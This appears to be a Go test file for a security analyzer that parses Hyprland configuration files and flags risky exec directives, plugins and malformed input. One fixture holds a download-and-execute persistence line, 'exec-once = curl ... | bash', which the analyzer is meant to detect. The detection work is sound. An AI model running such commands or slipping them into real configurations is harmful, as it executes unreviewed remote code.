package analyze

import (
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestHyprlandExecOnceProducesNestedEvidenceAndPersistence(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"config/hypr/hyprland.conf": []byte("exec-once = curl https://example.test/install | bash\n"),
	}))
	if len(result.Operations) < 3 || result.Operations[0].Category != "hyprland-exec-directive" || !hasFindingCategory(result, "download-and-execute") || !hasFindingCategory(result, "persistence") {
		t.Fatalf("Hyprland nested execution evidence = %#v", result)
	}
	finding := findingByCategory(t, result, "persistence")
	if finding.Claim != report.ClaimFact || len(finding.Related) < 2 || finding.Evidence[0].LineStart != 1 {
		t.Fatalf("Hyprland persistence provenance = %#v", finding)
	}
	for _, operation := range result.Operations[1:] {
		if operation.Evidence.LineStart != 1 || operation.Evidence.Path != "config/hypr/hyprland.conf" {
			t.Fatalf("embedded shell evidence was not mapped to config source: %#v", operation)
		}
	}
}

func TestHyprlandExecutionRulesAndBindExecAreParsedAsData(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"hyprland.conf": []byte("exec = [workspace 2 silent] /usr/bin/first --check\nbind = SUPER, Q, exec, /usr/bin/second --flag,with-comma\nbindd = SUPER, W, description, exec, /usr/bin/third\n"),
	}))
	want := map[string]bool{"/usr/bin/first": false, "/usr/bin/second": false, "/usr/bin/third": false}
	for _, operation := range result.Operations {
		if _, exists := want[operation.Command]; exists {
			want[operation.Command] = true
		}
	}
	for command, seen := range want {
		if !seen {
			t.Errorf("Hyprland command %q missing: %#v", command, result.Operations)
		}
	}
	if len(result.Unknowns) != 0 {
		t.Fatalf("literal Hyprland directives became unknown: %#v", result.Unknowns)
	}
}

func TestHyprlandCommentsAndNonExecBindingsAreIgnored(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"hyprland.conf": []byte("# exec-once = sudo\nbind = SUPER, Q, killactive\nwindowrule = exec sudo, class:fake\ntext = exec = pkexec\n"),
	}))
	if len(result.Operations) != 0 || len(result.Findings) != 0 || len(result.Unknowns) != 0 {
		t.Fatalf("Hyprland lookalikes produced behavior: %#v", result)
	}
}

func TestHyprlandSourceAndNativePluginStayDistinct(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"config/hypr/hyprland.conf": []byte("source = fragments/common.conf\nsource = $HOME/runtime.conf\nplugin = ./plugins/example.so\nplugin = ~/.config/hypr/dynamic.so\n"),
	}))
	if len(result.Operations) != 4 || !hasFindingCategory(result, "native-code-loading") {
		t.Fatalf("Hyprland source/plugin operations = %#v", result)
	}
	reasons := map[report.UnknownReason]int{}
	for _, unknown := range result.Unknowns {
		reasons[unknown.Reason]++
	}
	if reasons[report.UnknownDynamicValue] != 1 || reasons[report.UnknownNativeBehavior] != 1 {
		t.Fatalf("Hyprland source/plugin uncertainty = %#v", result.Unknowns)
	}
}

func TestHyprlandMalformedRulesAndShellRemainExplicitUnknowns(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"hyprland.conf": []byte("exec = [workspace 1 /bin/first\nexec-once = $(unterminated\nexec-shutdown = $(also-unterminated\n"),
	}))
	if len(result.Operations) != 2 { // directive facts survive; malformed rule has no operation.
		t.Fatalf("Hyprland malformed operation handling = %#v", result.Operations)
	}
	if len(result.Unknowns) != 3 || !hasLimitationCode(result, "hyprland-exec-unresolved") || !hasLimitationCode(result, "shell-parse-error") {
		t.Fatalf("Hyprland malformed behavior is not explicit: %#v", result)
	}
	ids := map[string]bool{}
	for _, unknown := range result.Unknowns {
		if ids[unknown.ID] {
			t.Fatalf("embedded parser unknown ID collision: %#v", result.Unknowns)
		}
		ids[unknown.ID] = true
	}
}

func TestHyprlandInvalidTextAndLineBudgetFailClosed(t *testing.T) {
	invalid := Sources(withValidManifest(map[string][]byte{"hyprland.conf": []byte{'[', 0xff, ']'}}))
	if len(invalid.Operations) != 0 || len(invalid.Unknowns) != 1 || invalid.Unknowns[0].Reason != report.UnknownParserFailure || !hasLimitationCode(invalid, "hyprland-invalid-text") {
		t.Fatalf("invalid Hyprland text did not fail closed: %#v", invalid)
	}
	large := Sources(withValidManifest(map[string][]byte{"hyprland.conf": []byte(strings.Repeat("$x = 1\n", maxHyprlandLines+1))}))
	if len(large.Unknowns) != 1 || large.Unknowns[0].Reason != report.UnknownBudgetExhaustion || !hasLimitationCode(large, "hyprland-line-budget") {
		t.Fatalf("Hyprland line budget is not explicit: %#v", large)
	}
	assertAnalyzerResult(t, large)
}

func TestHyprlandPathRecognitionIsNarrow(t *testing.T) {
	for _, name := range []string{"hyprland.conf", "config/hypr/monitors.conf", "config/hyprland/runtime.conf"} {
		if !isHyprlandConfigPath(name) {
			t.Errorf("Hyprland path %q was not recognized", name)
		}
	}
	for _, name := range []string{"ordinary.conf", "docs/hyprland-guide.txt", "myhypr/example.conf"} {
		if isHyprlandConfigPath(name) {
			t.Errorf("unrelated path %q became Hyprland configuration", name)
		}
	}
}
